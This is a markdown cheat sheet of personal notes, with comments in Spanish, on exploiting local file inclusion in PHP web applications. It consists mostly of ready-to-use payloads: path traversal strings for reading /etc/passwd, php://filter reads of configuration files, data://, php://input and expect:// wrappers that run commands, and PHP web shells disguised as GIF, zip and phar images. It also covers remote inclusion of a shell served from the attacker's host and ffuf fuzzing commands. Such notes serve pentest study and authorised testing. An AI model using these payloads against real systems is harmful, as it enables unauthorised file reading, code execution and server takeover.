# LFI
```
/etc/passwd
../../../etc/passwd
....//....//....//....//etc/passwd
....\/....\/....\/....\/etc/passwd
./languages/../../../../etc/passwd
////etc/passwd
/etc/./passwd

# URL ecnoder
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Custom payload
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

# PHP filter
php://filter/read=convert.base64-encode/resource=config
```

# Remote COde Execution
## PHP Wrappers
Para comprobar se ve esto 
```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Si esta allow_url_include = On
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

Si esta extension=expect
````
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)
```
# Shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Payload
http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
ftp://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
\\<OUR_IP>\share\shell.php&cmd=whoami
```

## LFI and File Uploads

```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Despues revisar en el codigo en que ruta esta para leerlo
```
./profile_images/shell.gif&cmd=id
zip://./profile_images/shell.jpg%23shell.php&cmd=id
phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

# Fuzzing
[LFI-wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
```
# Find paramter
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'

# Find Payload
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'

# Find directory
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php'
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ'

```
